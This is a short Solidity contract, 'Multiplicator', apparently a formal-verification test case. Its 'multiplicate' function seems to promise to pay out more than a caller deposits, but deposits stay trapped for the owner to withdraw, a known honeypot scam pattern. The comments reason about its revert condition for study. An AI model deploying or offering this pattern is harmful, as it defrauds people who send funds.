contract Multiplicator
{
    address public Owner = msg.sender;

    function withdraw() payable public
    {
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    // At the entrance to `multiplicate` the reciever balance is already increased by msg.value,
    // so the +msg.value makes it increase by 2 * msg.value at the exit of transfer.
    // revert only if msg.value >= address(this).balance && 
    // balance(receiver) + (address(this).balance+msg.value) > max_uint
    // The rule restrict msg.value > 0 so the if does not hold.
    function multiplicate(address to) public payable
    {
        if (msg.value >= address(this).balance) {
            payable(to).transfer(address(this).balance+msg.value);
        }
    }
}